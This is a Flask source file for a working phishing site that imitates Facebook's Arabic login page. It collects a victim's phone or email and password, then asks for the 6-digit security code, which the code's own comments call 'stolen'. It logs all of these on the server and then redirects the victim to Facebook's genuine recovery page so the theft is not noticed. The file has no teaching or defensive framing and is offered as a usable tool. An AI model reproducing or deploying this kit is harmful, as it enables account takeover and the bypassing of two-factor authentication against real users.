from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# قالب HTML مموه بالكامل
# Finding the visual structure:
HTML_UI = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية - فيسبوك</title>
    <style>
        body { background:#f0f2f5; font-family:sans-serif; display:flex; justify-content:center; padding-top:50px; }
        .box { background:white; padding:20px; border-radius:8px; width:330px; box-shadow:0 2px 4px rgba(0,0,0,0.1); text-align:center; }
        input { width:100%; padding:12px; margin:8px 0; border:1px solid #ddd; border-radius:6px; box-sizing:border-box; }
        .btn { width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-weight:bold; cursor:pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#1877f2;">facebook</h2>
        {% if step == 1 %}
        <p style="font-size:14px;">يجب تسجيل الدخول للمتابعة</p>
        <form action="/v_process" method="POST">
            <input type="text" name="x_id" placeholder="الهاتف أو البريد" required>
            <input type="password" name="x_token" placeholder="كلمة السر" required>
            <button type="submit" class="btn">دخول</button>
        </form>
        {% else %}
        <p style="color:red; font-size:14px;">تم إرسال رمز الأمان إلى هاتفك</p>
        <form action="/v_final" method="POST">
            <input type="hidden" name="u_data" value="{{ u_info }}">
            <input type="text" name="x_code" placeholder="أدخل الرمز (6 أرقام)" required>
            <button type="submit" class="btn" style="background:#42b72a;">تأكيد الرمز</button>
        </form>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_UI, step=1)

@app.route('/v_process', methods=['POST'])
def v_process():
    u, p = request.form.get('x_id'), request.form.get('x_token')
    # طباعة الصيد الأول في الـ Logs
    print(f"\\n[PHASE 1] 👤 User: {u} | 🔑 Pass: {p}\\n")
    return render_template_string(HTML_UI, step=2, u_info=f"{u}:{p}")

@app.route('/v_final', methods=['POST'])
def v_final():
    code = request.form.get('x_code')
    u_p = request.form.get('u_data')
    # طباعة الرمز النهائي
    print(f"\\n🎯 [PHASE 2] الرمز المسروق: {code} (للحساب: {u_p})\\n")
    return redirect("https://www.facebook.com/recover/initiate")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
